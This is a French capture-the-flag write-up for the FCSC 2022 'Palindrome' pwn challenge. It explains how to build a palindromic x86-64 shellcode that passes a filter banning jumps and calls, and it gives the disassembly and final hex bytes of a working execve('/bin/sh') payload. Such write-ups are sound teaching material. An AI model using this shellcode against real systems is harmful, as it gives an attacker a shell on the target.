---
title: Pwn - Palindrome
parent: FCSC 2022
grand_parent: CTF writeups
---

Palindrome
===

Un serveur nous autorise à exécuter n'importe quel shellcode à la
condition suivante (vérifiée par un script Python avec la lib Capstone):

* Il sera préfixé par un prologue qui met les registres à zéro
  et par un épilogue `syscall` et mis sur une pile exécutable
* Il ne doit contenir aucun `jmp` ou `call` ou `ret` ou assimilé
* Il doit être un palindrome (identique si on renverse la liste d'octets)

Objectif
---

Il suffit de pouvoir appeler le syscall execve avec la chaîne
`"/bin/sh"`. On pourra ensuite lire le flag tranquillement.

En temps normal on aurait donc besoin de:
```
0x00000000   8         488dbc2400010000  lea rdi, [rsp + 0x100]
0x00000008   7           48c7072f62696e  mov qword [rdi], 0x6e69622f   "/bin"
0x0000000f   8         48c747042f736800  mov qword [rdi + 4], 0x68732f "/sh"
0x00000017   5               b83b000000  mov eax, 0x3b
```
qui n'est pas du tout un palindrome.

Pour construire un palindrome, le plus simple est d'envoyer:
`miroir(shellcode) + shellcode` mais le miroir doit être un shellcode
valide.

Il est difficile de faire en sorte que des octets quelconques fassent
des instructions valides, mais l'instruction `movabs` suivie de 8 octets
permettrait de "cacher" des données.

Par example, essayons de faire apparaître un `movabs rax, $imm64`
dans le miroir. Cela correspond aux octets `48 b8`.

* Pour faire apparaître `b8` un `mov bl, 0xb8` suffit.
* Pour faire apparaître `48` on peut utiliser un nop `48 90`

```
0x00000000   8         488dbc2400010000  lea rdi, [rsp + 0x100]
0x00000008   7           48c7072f62696e  mov qword [rdi], 0x6e69622f
0x0000000f   8         48c747042f736800  mov qword [rdi + 4], 0x68732f
0x00000017   5               b83b000000  mov eax, 0x3b
0x0000001c   2                     b3b8  mov bl, 0xb8
0x0000001e   2                     4890  nop
```
dont le miroir est:
```
<CsInsn 0x0 [90]: nop >
<CsInsn 0x1 [48b8b30000003bb80068]: movabs rax, 0x6800b83b000000b3>
<CsInsn 0xb [732f]: jae 0x3c>
<CsInsn 0xd [0447]: add al, 0x47>
<invalid>
```

On ajoute alors encore des petites séquences `b3 b8 48 90 90...`
qui à l'endroit font `mov bl, 0xb8; nop; nop..`
et à l'envers font `nop; nop; movabs ...`

La version finale est:
```
0x00000000   8         488dbc2400010000  lea rdi, [rsp + 0x100]
0x00000008   2                     b3b8  mov bl, 0xb8
0x0000000a   2                     4890  nop
0x0000000c   7           48c7072f62696e  mov qword [rdi], 0x6e69622f
0x00000013   2                     b3b8  mov bl, 0xb8
0x00000015   8         48c747042f736800  mov qword [rdi + 4], 0x68732f
0x0000001d   2                     b3b8  mov bl, 0xb8
0x0000001f   2                     4890  nop
0x00000021   1                       90  nop
0x00000022   5               b83b000000  mov eax, 0x3b
0x00000027   2                     b3b8  mov bl, 0xb8
0x00000029   2                     4890  nop
```

avec son miroir (total 86 octets):
```
0x00000000   1                       90  nop
0x00000001  10     48b8b30000003bb89090  movabs rax, 0x9090b83b000000b3
0x0000000b  10     48b8b30068732f0447c7  movabs rax, 0xc747042f736800b3
0x00000015  10     48b8b36e69622f07c748  movabs rax, 0x48c7072f62696eb3
0x0000001f   1                       90  nop
0x00000020  10     48b8b30000010024bc8d  movabs rax, 0x8dbc2400010000b3
0x0000002a   9       48488dbc2400010000  lea rdi, [rsp + 0x100]
0x00000033   2                     b3b8  mov bl, 0xb8
0x00000035   2                     4890  nop
0x00000037   7           48c7072f62696e  mov qword [rdi], 0x6e69622f
0x0000003e   2                     b3b8  mov bl, 0xb8
0x00000040   8         48c747042f736800  mov qword [rdi + 4], 0x68732f
0x00000048   2                     b3b8  mov bl, 0xb8
0x0000004a   2                     4890  nop
0x0000004c   1                       90  nop
0x0000004d   5               b83b000000  mov eax, 0x3b
0x00000052   2                     b3b8  mov bl, 0xb8
0x00000054   2                     4890  nop
```

En hexadécimal:
```
9048b8b30000003bb8909048b8b30068732f0447c748b8b36e69622f07c7489048b8b30000010024bc8d48
488dbc2400010000b3b8489048c7072f62696eb3b848c747042f736800b3b8489090b83b000000b3b84890
```
